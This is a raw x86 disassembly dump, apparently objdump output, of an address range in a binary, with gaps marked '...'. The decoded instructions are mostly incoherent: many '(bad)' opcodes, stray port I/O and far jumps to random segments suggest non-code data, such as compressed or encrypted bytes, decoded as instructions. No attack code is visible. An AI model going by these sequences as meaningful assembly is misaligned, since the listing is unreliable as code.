  42c7db:	xchg   DWORD PTR [ebx+0x7c],edi
  42c7de:	cs hlt 
  42c7e0:	gs fwait
  42c7e2:	cmp    bl,BYTE PTR [edi]
  42c7e4:	test   cl,0x5b
  42c7e7:	add    al,0xad
  42c7e9:	addr16 out dx,al
  42c7eb:	and    al,0xc
  42c7ed:	jns    0x42c7ef
	...
  42c853:	add    BYTE PTR [eax],al
  42c855:	add    BYTE PTR [eax],bh
  42c857:	mov    DWORD PTR [edx-0x6b],ebp
  42c85a:	sti    
  42c85b:	idiv   edi
  42c85d:	lods   eax,DWORD PTR ds:[esi]
  42c85e:	pop    ebp
  42c85f:	sbb    eax,0x2e6fa40e
  42c864:	cmc    
  42c865:	aas    
  42c866:	fld    QWORD PTR [bx+di]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    BYTE PTR [edx],dl
  42c86f:	pop    ebx
  42c870:	jge    0x42c8c6
  42c872:	jo     0x42c878
  42c874:	sbb    al,0x85
  42c876:	cmp    DWORD PTR [eax+0x687fc35c],eax
  42c87c:	retf   
  42c87d:	sbb    al,BYTE PTR [eax]
  42c87f:	xor    edi,DWORD PTR [ecx]
  42c881:	sbb    eax,0xf7f662be
  42c886:	xchg   esp,eax
  42c887:	mov    ebx,0xe1d772c5
  42c88c:	or     dl,dl
  42c88e:	pusha  
  42c88f:	ds das 
  42c891:	(bad)  
  42c892:	clc    
  42c893:	popf   
  42c894:	in     al,0x40
  42c896:	inc    edx
  42c897:	and    al,0xe4
  42c899:	jmp    0x42c826
  42c89b:	mov    esp,0xcb354337
  42c8a0:	icebp  
  42c8a1:	xlat   BYTE PTR ds:[ebx]
  42c8a2:	ret    
  42c8a3:	push   0x1c
  42c8a5:	mov    eax,ds:0x10c08fa1
  42c8aa:	jecxz  0x42c85c
  42c8ac:	bound  esp,QWORD PTR [ebx+0x24886b7]
  42c8b2:	add    al,0xe8
  42c8b4:	stos   BYTE PTR es:[edi],al
  42c8b5:	test   al,0xff
  42c8b7:	push   ss
  42c8b8:	dec    esp
  42c8b9:	ret    0x236
  42c8bc:	xor    DWORD PTR [edi+0x4a],eax
  42c8bf:	imul   esp,DWORD PTR [edi-0x50],0xfffffffd
  42c8c3:	js     0x42c8f7
  42c8c5:	jo     0x42c92b
  42c8c7:	and    ch,BYTE PTR [ecx+edi*8]
  42c8ca:	xchg   edx,eax
  42c8cb:	adc    al,0xa1
  42c8cd:	push   eax
  42c8ce:	data16 fisttp DWORD PTR [ecx]
  42c8d1:	aas    
  42c8d2:	nop
  42c8d3:	adc    bl,0x8b
  42c8d6:	push   ecx
  42c8d7:	scas   al,BYTE PTR es:[edi]
  42c8d8:	loope  0x42c8f1
  42c8da:	pop    esi
  42c8db:	in     al,0x59
  42c8dd:	sub    BYTE PTR [ebp-0x3acdfce5],dl
  42c8e3:	sub    BYTE PTR [ebx+0x27],bh
  42c8e6:	sti    
  42c8e7:	mov    cl,0x15
  42c8e9:	dec    edi
  42c8ea:	jmp    0x42c8fb
  42c8ec:	bound  ebp,QWORD PTR [edx+0x10]
  42c8ef:	and    DWORD PTR [esi-0x62c37bf8],ecx
  42c8f5:	retf   0x6ae
  42c8f8:	fistp  QWORD PTR [ebp-0x2]
  42c8fb:	repnz inc ebp
  42c8fd:	repnz (bad) 
  42c8ff:	aas    
  42c900:	jmp    0x42c8fa
  42c902:	or     dh,al
  42c904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c905:	sbb    DWORD PTR [esp+edx*4+0x10],0x5c82bf93
  42c90d:	daa    
  42c90e:	aas    
  42c90f:	fld    TBYTE PTR [esp+ebx*2+0x54e3fe54]
  42c916:	outs   dx,DWORD PTR ds:[esi]
  42c917:	cmp    DWORD PTR [esi-0xd],ebx
  42c91a:	mov    dl,0x47
  42c91c:	mov    ecx,DWORD PTR [eax+0x41bd1fe1]
  42c922:	push   esp
  42c923:	mov    eax,ds:0x6dd67048
  42c928:	xchg   edx,eax
  42c929:	ins    BYTE PTR es:[edi],dx
  42c92a:	adc    al,BYTE PTR [eax+0x697ed9ad]
  42c930:	bts    DWORD PTR [ecx-0x12],eax
  42c934:	mov    al,ds:0xe5fb808b
  42c939:	sub    BYTE PTR [edi-0x1cd56b75],dl
  42c93f:	aad    0xa9
  42c941:	inc    edx
  42c942:	in     al,dx
  42c943:	popa   
  42c944:	popa   
  42c945:	out    0xb4,eax
  42c947:	lea    ebp,[esi+0x1]
  42c94a:	inc    edi
  42c94b:	stc    
  42c94c:	jle    0x42c98d
  42c94e:	mov    ebp,0x9b07043c
  42c953:	scas   al,BYTE PTR es:[edi]
  42c954:	imul   DWORD PTR [eax+ebx*4+0x39]
  42c958:	rcr    dl,cl
  42c95a:	pop    edx
  42c95b:	push   es
  42c95c:	retf   0xbc70
  42c95f:	push   ds
  42c960:	in     al,0x28
  42c962:	in     al,dx
  42c963:	fistp  QWORD PTR [edx-0x22]
  42c966:	xchg   esi,eax
  42c967:	xchg   ebp,eax
  42c968:	add    DWORD PTR [edx],ebp
  42c96a:	mov    eax,0x2bdef7
	...
  42c9d3:	add    BYTE PTR [eax],al
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0xedd739b2
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [edx],ch
  42c9ef:	inc    DWORD PTR [edx-0x59]
  42c9f2:	punpcklwd mm4,mm5
  42c9f5:	push   ds
  42c9f6:	div    BYTE PTR [edi+0x20]
  42c9f9:	fdiv   QWORD PTR fs:[bp+di-0x1e]
  42c9fe:	lds    edi,FWORD PTR [eax]
  42ca00:	push   0x91cb5fa7
  42ca05:	sub    ch,BYTE PTR [ebx+ecx*1]
  42ca08:	adc    al,0x43
  42ca0a:	mov    ds:0xbd31c546,al
  42ca0f:	cmp    DWORD PTR [eax+0x28],0xffffffea
  42ca13:	push   ebx
  42ca14:	int3   
  42ca15:	adc    eax,0xbdab9861
  42ca1a:	lock xor dl,bh
  42ca1d:	leave  
  42ca1e:	sub    al,0x8e
  42ca20:	out    dx,al
  42ca21:	loope  0x42ca82
  42ca23:	xor    DWORD PTR [ebp-0x2065e626],edx
  42ca29:	mov    ebp,?
  42ca2b:	xchg   esi,eax
  42ca2c:	xor    bl,ah
  42ca2e:	jg     0x42c9db
  42ca30:	bound  edx,QWORD PTR [esi+0x2e1da581]
  42ca36:	push   es
  42ca37:	daa    
  42ca38:	mov    edi,0xcc205ca3
  42ca3d:	pop    eax
  42ca3e:	fcmove st,st(5)
  42ca40:	mov    esi,DWORD PTR [ebp-0x5a]
  42ca43:	push   esi
  42ca44:	add    ecx,DWORD PTR [esi+edi*1-0x770d0a7a]
  42ca4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca4c:	(bad)  
  42ca4d:	in     al,0xe9
  42ca4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca50:	mov    al,ds:0x9a367554
  42ca55:	push   esp
  42ca56:	push   cs
  42ca57:	scas   eax,DWORD PTR es:[edi]
  42ca58:	jo     0x42ca8a
  42ca5a:	pop    edx
  42ca5b:	or     eax,0xf088835a
  42ca60:	sbb    edx,DWORD PTR [ecx+0xeea7e64]
  42ca66:	jecxz  0x42ca0b
  42ca68:	sar    DWORD PTR [esi+0x5726d8c8],1
  42ca6e:	jmp    0x9a6:0x1019cda5
  42ca75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca76:	repnz (bad) 
  42ca78:	into   
  42ca79:	aad    0x74
  42ca7b:	enter  0xe565,0x88
  42ca7f:	into   
  42ca80:	popf   
  42ca81:	jl     0x42ca42
  42ca83:	push   0xffd4c86f
  42ca88:	gs sbb eax,0x5ef2b1b4
  42ca8e:	and    ebp,ebp
  42ca90:	sub    BYTE PTR [ebx],ah
  42ca92:	xchg   ebx,eax
  42ca93:	into   
  42ca94:	mov    ecx,0xa9dc2cb9
  42ca99:	loop   0x42ca64
  42ca9b:	mov    dh,0xc8
  42ca9d:	or     BYTE PTR [eax],ah
  42ca9f:	and    ebx,eax
  42caa1:	add    ah,BYTE PTR [ebp+0x15]
  42caa4:	cmp    eax,0x44c57f2
  42caa9:	mov    esp,0x9d255115
  42caae:	nop
  42caaf:	push   ebx
  42cab0:	outs   dx,DWORD PTR ds:[esi]
  42cab1:	lea    esi,ds:0x1062b94f
  42cab7:	lods   al,BYTE PTR ds:[esi]
  42cab8:	add    DWORD PTR [esi+eiz*1+0x62f822bc],esp
  42cabf:	mov    bl,BYTE PTR [esi-0x8]
  42cac2:	sub    DWORD PTR [edx],ebp
  42cac4:	mov    ebp,0xc45b50b9
  42cac9:	pushf  
  42caca:	inc    ebp
  42cacb:	push   ds
  42cacc:	jne    0x42ca95
  42cace:	sub    ebp,0x5ffc75ed
  42cad4:	pop    es
  42cad5:	mov    ds:0xecb66751,al
  42cada:	mov    ah,0xc5
  42cadc:	mov    ah,0xcb
  42cade:	sub    ebx,DWORD PTR [ecx-0x6dd1e2ce]
  42cae4:	sub    eax,0xf606edea
  42cae9:	cli    
  42caea:	inc    esi
  42caeb:	adc    al,0xc5
  42caed:	xchg   esp,eax
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x7f666ec0]
  42cb64:	in     al,0x75
  42cb66:	fild   WORD PTR [bx+di]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    BYTE PTR [edi],ch
  42cb6f:	dec    ebx
  42cb70:	bound  ebp,QWORD PTR [edx]
  42cb72:	retf   
  42cb73:	or     edx,DWORD PTR [edi]
  42cb75:	popa   
  42cb76:	lahf   
  42cb77:	mov    ebx,0x870e637b
  42cb7c:	lock inc eax
  42cb7e:	pop    ebx
  42cb7f:	xor    BYTE PTR [ebx+0x47],ah
  42cb82:	sub    eax,0xd5f6cd9b
  42cb87:	sub    BYTE PTR [ebp+0x6d],al
  42cb8a:	outs   dx,BYTE PTR ds:[esi]
  42cb8b:	jae    0x42cbd1
  42cb8d:	xchg   ecx,eax
  42cb8e:	push   edi
  42cb8f:	std    
  42cb90:	xor    DWORD PTR [esi+edx*4],0xdeab124b
  42cb97:	(bad)  
  42cb98:	mov    al,ds:0x4a89f25d
  42cb9d:	add    al,0xc5
  42cb9f:	in     eax,dx
  42cba0:	or     cl,al
  42cba2:	fadd   DWORD PTR [esi+0xc]
  42cba5:	mov    BYTE PTR fs:[eax+edi*2],dl
  42cba9:	not    dh
  42cbab:	jmp    0x42cbea
  42cbad:	sbb    al,0x7
  42cbaf:	fst    DWORD PTR [edi+0x41c58516]
  42cbb5:	daa    
  42cbb6:	dec    eax
  42cbb7:	sub    edi,ecx
  42cbb9:	mov    ?,edi
  42cbbb:	jo     0x42cb77
  42cbbd:	mov    ch,0xc9
  42cbbf:	xor    DWORD PTR [edi+0x5e012638],esi
  42cbc5:	mov    edx,0x5aa8aaf3
  42cbcb:	adc    BYTE PTR [ebx],ch
  42cbcd:	mov    DWORD PTR [edx+ecx*8-0x5a],0x61e17aa0
  42cbd5:	dec    ebx
  42cbd6:	fisub  DWORD PTR [ecx-0x4e24fe52]
  42cbdc:	jmp    0x9b49:0xaf689bc9
  42cbe3:	(bad)  
  42cbe4:	sbb    al,0x25
  42cbe6:	push   ss
  42cbe7:	fnstenv [edi]
  42cbe9:	xlat   BYTE PTR ds:[ebx]
  42cbea:	or     bh,BYTE PTR [esi+0x23eb056c]
  42cbf0:	repz adc DWORD PTR [ebp-0xb],0x7f
  42cbf5:	daa    
  42cbf6:	sbb    al,0xc
  42cbf8:	aam    0x34
  42cbfa:	repz clc 
  42cbfc:	fstp   QWORD PTR [ecx]
  42cbfe:	aad    0xbf
  42cc00:	push   cs
  42cc01:	sti    
  42cc02:	rcl    BYTE PTR [ebx],1
  42cc04:	mov    esi,0xcd3548f3
  42cc09:	fcom   QWORD PTR [edx+0x25]
  42cc0c:	stos   DWORD PTR es:[edi],eax
  42cc0d:	mov    cl,0x8f
  42cc0f:	imul   ebx,edi,0x734f3f92
  42cc15:	dec    edx
  42cc16:	(bad)  
  42cc18:	lock pop ds
  42cc1a:	push   edi
  42cc1b:	add    al,BYTE PTR [esi+0x7690e240]
  42cc21:	jle    0x42cc7b
  42cc23:	mov    dh,BYTE PTR [esi+0x62e24a65]
  42cc29:	shl    bh,0xe7
  42cc2c:	lock pop esp
  42cc2e:	scas   eax,DWORD PTR es:[edi]
  42cc2f:	scas   eax,DWORD PTR es:[edi]
  42cc30:	repz mov cl,0x70
  42cc33:	push   es
  42cc34:	lahf   
  42cc35:	jge    0x42cc9d
  42cc37:	push   ecx
  42cc38:	lods   al,BYTE PTR ds:[esi]
  42cc39:	push   esp
  42cc3a:	repnz add bl,BYTE PTR [ebx-0x41b4db4d]
  42cc41:	hlt    
  42cc42:	fild   DWORD PTR [ebx]
  42cc44:	mov    DWORD PTR [edx+eiz*8],edi
  42cc47:	sbb    DWORD PTR [esi],edx
  42cc49:	iret   
  42cc4a:	xor    al,0xc0
  42cc4c:	pop    ecx
  42cc4d:	pop    ecx
  42cc4e:	dec    DWORD PTR [ecx]
  42cc50:	in     eax,0x6e
  42cc52:	sub    eax,0x2a1ccafa
  42cc57:	add    esp,DWORD PTR [ebp+0x7e]
  42cc5a:	mov    ?,WORD PTR [ebx+0x37]
  42cc5d:	clc    
  42cc5e:	sbb    eax,0x3ed244de
  42cc63:	xchg   ebx,eax
  42cc64:	cmp    al,0x2f
  42cc66:	sub    eax,0xd3756e6f
  42cc6b:	lock cmp eax,DWORD PTR [ebx+0x0]
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x212ec35e
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [esi-0xde28856],dl
  42ccf3:	outs   dx,DWORD PTR ds:[esi]
  42ccf4:	loopne 0x42cce7
  42ccf6:	stc    
  42ccf7:	push   0xffffffce
  42ccf9:	loop   0x42ccc3
  42ccfb:	adc    al,0x5f
  42ccfd:	sbb    ah,BYTE PTR [esi+ebx*8-0x35]
  42cd01:	adc    DWORD PTR [esi+eax*2],esi
  42cd04:	data16 sahf 
  42cd06:	scas   al,BYTE PTR es:[edi]
  42cd07:	xor    DWORD PTR [ecx-0x1d9f6b11],ebx
  42cd0d:	sbb    edx,edx
  42cd0f:	push   ecx
  42cd10:	pop    esp
  42cd11:	sbb    edi,DWORD PTR [ebx+0xc]
  42cd14:	push   ebp
  42cd15:	lahf   
  42cd16:	leave  
  42cd17:	aaa    
  42cd18:	loopne 0x42cccd
  42cd1a:	nop
  42cd1b:	js     0x42cd4d
  42cd1d:	ins    BYTE PTR es:[edi],dx
  42cd1e:	sbb    eax,0xbe21905
  42cd23:	dec    edi
  42cd24:	retf   
  42cd25:	dec    edi
  42cd26:	jmp    0x764cc507
  42cd2b:	(bad)  
  42cd2c:	aam    0xb8
  42cd2e:	mov    ah,0xce
  42cd30:	xchg   ecx,esp
  42cd32:	mov    ch,0x13
  42cd34:	add    DWORD PTR [ebx],esp
  42cd36:	xor    esp,DWORD PTR [esi-0x4ee63372]
  42cd3c:	jge    0x42cd3f
  42cd3e:	or     bh,cl
  42cd40:	fbstp  TBYTE PTR [edx]
  42cd42:	fdivr  QWORD PTR [bp+0x59a0]
  42cd47:	das    
  42cd48:	in     al,0xa1
  42cd4a:	adc    al,0xb
  42cd4c:	jne    0x42cd26
  42cd4e:	or     ecx,DWORD PTR [edx-0x2b71a127]
  42cd54:	mov    ah,0xde
  42cd56:	adc    bh,BYTE PTR [edi-0x33]
  42cd59:	dec    eax
  42cd5a:	psllq  mm3,QWORD PTR [ebx+0x552e3f9d]
  42cd61:	aaa    
  42cd62:	jno    0x42cd73
  42cd64:	pop    ebx
  42cd65:	xchg   ebx,eax
  42cd66:	lods   al,BYTE PTR ds:[esi]
  42cd67:	cld    
  42cd68:	sub    ch,al
  42cd6a:	inc    ebp
  42cd6b:	loopne 0x42cd76
  42cd6d:	loopne 0x42cd58
  42cd6f:	ret    
  42cd70:	adc    eax,0xbcfaa490
  42cd75:	mov    ebx,0x2b848da0
  42cd7a:	in     eax,dx
  42cd7b:	pop    edi
  42cd7c:	xor    dh,BYTE PTR [ebx+0x55eef6af]
  42cd82:	ins    BYTE PTR es:[edi],dx
  42cd83:	int    0xdc
  42cd85:	push   0xec52e703
  42cd8a:	push   ss
  42cd8b:	jne    0x42cdc4
  42cd8d:	test   ah,0xd5
  42cd90:	sbb    al,0x8
  42cd92:	pop    ebx
  42cd93:	(bad)  
  42cd94:	sub    al,0x18
  42cd96:	adc    al,0x96
  42cd98:	mov    ?,WORD PTR [edx-0x4e]
  42cd9b:	xchg   edi,eax
  42cd9c:	lods   al,BYTE PTR ds:[esi]
  42cd9d:	addr16 xchg ebx,eax
  42cd9f:	inc    esp
  42cda0:	test   al,0x7c
  42cda2:	xor    ecx,ebx
  42cda4:	pop    eax
  42cda5:	lock xor cl,ah
  42cda8:	(bad)  
  42cda9:	jg     0x42cdae
  42cdab:	iret   
  42cdac:	mov    cl,BYTE PTR [ecx+0x181dda7a]
  42cdb2:	retf   0xeb52
  42cdb5:	and    esp,DWORD PTR [eax+0xeeee1b6]
  42cdbb:	sahf   
  42cdbc:	in     al,0xc3
  42cdbe:	adc    BYTE PTR [ebp+0x27cdc151],bh
  42cdc4:	or     edx,DWORD PTR [ebx-0x27fb8488]
  42cdca:	loopne 0x42cdbd
  42cdcc:	mov    eax,DWORD PTR [eax+0x5c]
  42cdcf:	div    BYTE PTR [edx+0x37d375bf]
  42cdd5:	adc    ebx,ebp
  42cdd7:	cmp    BYTE PTR [edi+0x312f2046],dl
  42cddd:	inc    ecx
  42cdde:	xor    dl,BYTE PTR [ecx+0x2c]
  42cde1:	mov    edx,DWORD PTR [ecx+0x7c]
  42cde4:	cs bswap esp
  42cde7:	pop    esi
  42cde8:	add    DWORD PTR [ebp-0x2e38731f],eax
	...
  42ce56:	sbb    DWORD PTR [ecx-0x20017802],esp
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xf9
  42ce63:	mov    dh,0x1f
  42ce65:	mov    esp,DWORD PTR [edi-0x1f]
  42ce68:	add    DWORD PTR [eax],eax
  42ce6a:	add    BYTE PTR [ecx],al
  42ce6c:	add    BYTE PTR [eax],al
  42ce6e:	lds    ebx,FWORD PTR [ebp+eiz*4+0x14]
  42ce72:	mov    ecx,0xe8fcd491
  42ce77:	sub    eax,0xcf253245
  42ce7c:	loopne 0x42cea7
  42ce7e:	fs leave 
  42ce80:	push   eax
  42ce81:	xchg   ch,ah
  42ce83:	(bad)
  42ce87:	int    0xb0
  42ce89:	call   0xfdfe:0x8b89b189
  42ce90:	jecxz  0x42ce3e
  42ce92:	pop    ss
  42ce93:	sub    DWORD PTR [ebx+ebx*1-0x56],ebx
  42ce97:	(bad)  
  42ce98:	shr    cl,0xd
  42ce9b:	sbb    al,0xde
  42ce9d:	(bad)  
  42ce9e:	in     eax,0x9a
  42cea0:	dec    edi
  42cea1:	cmp    dl,BYTE PTR [ebp+0x7f50cf25]
  42cea7:	adc    cl,dh
  42cea9:	add    BYTE PTR [ebp+0x4a311521],bh
  42ceaf:	xchg   ebp,eax
  42ceb0:	fisttp QWORD PTR [edi-0x35fbb5a8]
  42ceb6:	sbb    eax,0xff3d845b
  42cebb:	dec    esi
  42cebc:	out    dx,al
  42cebd:	mov    eax,0x8aeec520
  42cec2:	inc    esp
  42cec3:	xor    BYTE PTR [edi-0x16],cl
  42cec6:	add    BYTE PTR [edx+0x3b],0x68
  42ceca:	xor    bl,BYTE PTR [edx]
  42cecc:	jmp    0x42ce9c
  42cece:	sbb    bl,BYTE PTR [esi+0x711fbb50]
  42ced4:	jmp    0x42ce8d
  42ced6:	scas   al,BYTE PTR es:[edi]
  42ced7:	xchg   DWORD PTR [edx-0x5df161c0],edx
  42cedd:	xchg   ebx,eax
  42cede:	sub    bh,BYTE PTR [edi+0x346e4b9f]
  42cee4:	inc    esi
  42cee5:	dec    eax
  42cee6:	mov    BYTE PTR [eax+ebp*4],0x95
  42ceea:	sub    al,0xe5
  42ceec:	ret    
  42ceed:	das    
  42ceee:	pop    eax
  42ceef:	data16 jl 0x42cece
  42cef2:	pop    ebp
  42cef3:	lahf   
  42cef4:	inc    esi
  42cef5:	pop    ebp
  42cef6:	sbb    eax,0x1570b80c
  42cefb:	ds and al,0x48
  42cefe:	cmp    BYTE PTR [edx+0x277a3754],0x2b
  42cf05:	dec    ebx
  42cf06:	imul   ebx,DWORD PTR [edx-0x566eb4fa],0xffffffa3
  42cf0d:	leave  
  42cf0e:	test   DWORD PTR [esi],eax
  42cf10:	popa   
  42cf11:	shr    DWORD PTR [ebx+0xacb4612],cl
  42cf17:	call   0x62c8738d
  42cf1c:	(bad)  
  42cf1d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf1f:	ins    DWORD PTR es:[edi],dx
  42cf20:	clc    
  42cf21:	inc    eax
  42cf22:	pop    edx
  42cf23:	xor    ah,0x8b
  42cf26:	fnstsw WORD PTR [ebx]
  42cf28:	adc    ebx,DWORD PTR ds:0x7c0e2a00
  42cf2e:	in     al,0x87
  42cf30:	std    
  42cf31:	jo     0x42cf63
  42cf33:	pushf  
  42cf34:	inc    esi
  42cf35:	(bad)  
  42cf37:	lea    ebx,[eax]
  42cf39:	popa   
  42cf3a:	add    eax,0x91178eb8
  42cf3f:	in     al,dx
  42cf40:	test   BYTE PTR [ecx-0x7658ca4a],0x6a
  42cf47:	repnz and DWORD PTR [esi+0x2d4415e5],0x2b
  42cf4f:	sbb    BYTE PTR [edx],bh
  42cf51:	sbb    al,BYTE PTR [eax]
  42cf53:	mov    al,0x8a
  42cf55:	xchg   esp,eax
  42cf56:	clc    
  42cf57:	fsubr  QWORD PTR [eax+eax*8]
  42cf5a:	cmc    
  42cf5b:	mov    edx,0x989b9736
  42cf60:	dec    eax
  42cf61:	stc    
  42cf62:	in     eax,0x1c
  42cf64:	ret    
  42cf65:	mov    al,0xd7
  42cf67:	push   esi
  42cf68:	stc    
  42cf69:	lds    eax,FWORD PTR [edx+0x6a]
  42cf6c:	push   ecx
  42cf6d:	ret    
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    esi,FWORD PTR [eax-0xf]
  42cfe4:	fisttp WORD PTR [ebx+0x1e267]
  42cfea:	add    BYTE PTR [ecx],al
  42cfec:	add    BYTE PTR [eax],al
  42cfee:	jp     0x42cfef
  42cff0:	xchg   DWORD PTR [esi-0x7984cb98],edx
  42cff6:	jae    0x42d012
  42cff8:	inc    edx
  42cff9:	loope  0x42d003
  42cffb:	shl    DWORD PTR [ebx-0x2ed31db7],1
  42d001:	or     ebp,0xffffff9a
  42d004:	fmul   st(3),st
  42d006:	dec    eax
  42d007:	mov    bl,0xe
  42d009:	and    esi,DWORD PTR [ebx]
  42d00b:	sbb    eax,DWORD PTR [esi]
  42d00d:	outs   dx,DWORD PTR ds:[esi]
  42d00e:	mov    DWORD PTR [ecx],edi
  42d010:	enter  0x15f,0x2d
  42d014:	or     DWORD PTR [eax-0xaefbd3a],ebp
  42d01a:	jnp    0x42cfa5
  42d01c:	jecxz  0x42d013
  42d01e:	enter  0x38d9,0xc0
  42d022:	jmp    0x42d064
  42d024:	outs   dx,BYTE PTR ds:[esi]
  42d025:	stos   BYTE PTR es:[edi],al
  42d026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d027:	adc    esi,DWORD PTR [edx+0x5b]
  42d02a:	push   esi
  42d02b:	cmc    
  42d02c:	mov    bh,0x2d
  42d02e:	dec    ebx
  42d02f:	aas    
  42d030:	mov    esi,0x947b078a
  42d035:	push   edi
  42d036:	test   BYTE PTR [ebx],0x22
  42d039:	das    
  42d03a:	inc    ebx
  42d03b:	and    dl,cl
  42d03d:	sub    al,0x6b
  42d03f:	xchg   BYTE PTR [esi],cl
  42d041:	sbb    edx,DWORD PTR [edx]
  42d043:	jne    0x42d0b7
  42d045:	icebp  
  42d046:	mov    ecx,ss
  42d048:	sar    BYTE PTR [ecx+ebp*8-0x15],0xd4
  42d04d:	clc    
  42d04e:	mov    cl,0xb1
  42d050:	xor    DWORD PTR [ebp+0x7d3a1d03],ecx
  42d056:	(bad)  
  42d057:	mov    ebx,0x2a5781cc
  42d05c:	mov    bh,0x8
  42d05e:	adc    ch,BYTE PTR [edx+0x48]
  42d061:	out    dx,eax
  42d062:	clc    
  42d063:	and    eax,0x9e1b8cba
  42d068:	stos   BYTE PTR es:[edi],al
  42d069:	inc    esi
  42d06a:	jns    0x42cfed
  42d06c:	and    esi,DWORD PTR [esi+0x6f]
  42d06f:	dec    eax
  42d070:	cmp    dh,BYTE PTR [esi]
  42d072:	and    BYTE PTR [ecx-0x5852cc4e],cl
  42d078:	popf   
  42d079:	inc    ecx
  42d07a:	dec    ecx
  42d07b:	dec    edi
  42d07c:	xchg   DWORD PTR [edx-0x3],eax
  42d07f:	adc    eax,0x473a4e54
  42d084:	out    dx,al
  42d085:	sbb    BYTE PTR [esi+eax*2+0x50],ah
  42d089:	sub    al,0xb8
  42d08b:	mov    bl,0x90
  42d08d:	lods   eax,DWORD PTR ds:[esi]
  42d08e:	imul   esi,edx,0xfffffff8
  42d091:	jmp    0xb571:0xd59517d1
  42d098:	inc    ebx
  42d099:	popf   
  42d09a:	adc    ecx,DWORD PTR [ecx+0x76331833]
  42d0a0:	pop    ds
  42d0a1:	pop    ebp
  42d0a2:	xchg   edx,eax
  42d0a4:	(bad)  
  42d0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0a7:	pop    ebp
  42d0a8:	sbb    esp,DWORD PTR [esi]
  42d0aa:	jns    0x42d042
  42d0ac:	cmp    BYTE PTR [ebp+eax*2-0x44],ah
  42d0b0:	jmp    DWORD PTR [esi-0xafbbac]
  42d0b6:	pop    ds
  42d0b7:	jl     0x42d0f5
  42d0b9:	xchg   edi,eax
  42d0ba:	aad    0x73
  42d0bc:	mov    ecx,fs
  42d0be:	aas    
  42d0bf:	sub    DWORD PTR [ebp-0xee40da2],esp
  42d0c5:	fs lahf 
  42d0c7:	hlt    
  42d0c8:	and    al,0x3d
  42d0ca:	push   ebp
  42d0cb:	pop    ds
  42d0cc:	fwait
  42d0cd:	in     eax,dx
  42d0ce:	push   0x1cbec45a
  42d0d3:	jg     0x42d0a2
  42d0d5:	(bad)  
  42d0d6:	mov    edx,0x23e6e315
  42d0db:	in     al,dx
  42d0dc:	pop    esp
  42d0dd:	and    BYTE PTR [ebx-0x6bf06e0],dh
  42d0e3:	add    eax,0x163a2abf
  42d0e8:	cli    
  42d0e9:	pop    es
  42d0ea:	stc    
  42d0eb:	cmp    BYTE PTR [ecx+0x13],ah
	...
  42d155:	add    BYTE PTR [eax+0x3a],dl
  42d158:	(bad)  
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [esi+0x675a6369],cl
  42d167:	jecxz  0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [edi],al
  42d16f:	fild   DWORD PTR [edx+0xbbb2246]
  42d175:	fidiv  WORD PTR [eax]
  42d177:	sbb    DWORD PTR [esi-0x7510f023],ebx
  42d17d:	mov    bl,0x37
  42d17f:	sbb    ebp,DWORD PTR [ebp-0xe]
  42d182:	in     eax,0xff
  42d184:	xor    al,0xb
  42d186:	daa    
  42d187:	dec    ebx
  42d188:	dec    eax
  42d189:	xchg   ebp,eax
  42d18a:	cli    
  42d18b:	push   0xfffffff0
  42d18d:	push   cs
  42d18e:	call   0x3854595c
  42d193:	mov    bl,0xa1
  42d195:	adc    ebx,0x5dc48524
  42d19b:	mov    cl,dh
  42d19d:	pop    ebx
  42d19e:	push   ebp
  42d19f:	jno    0x42d1df
  42d1a1:	out    dx,al
  42d1a2:	sbb    bh,ch
  42d1a4:	dec    ebp
  42d1a5:	and    BYTE PTR [ebp+ebp*8+0x609d3903],bh
  42d1ac:	xchg   edi,eax
  42d1ad:	test   DWORD PTR [edi-0x66],0x1bb121d5
  42d1b4:	dec    ecx
  42d1b5:	ror    bh,1
  42d1b7:	inc    edi
  42d1b8:	adc    DWORD PTR [esi-0x115c249d],edx
  42d1be:	jbe    0x42d175
  42d1c0:	dec    edx
  42d1c1:	aam    0x92
  42d1c3:	loopne 0x42d1fa
  42d1c5:	stc    
  42d1c6:	xor    ch,dh
  42d1c8:	outs   dx,DWORD PTR ds:[esi]
  42d1c9:	test   al,0xe6
  42d1cb:	(bad)  
  42d1cc:	pop    ebp
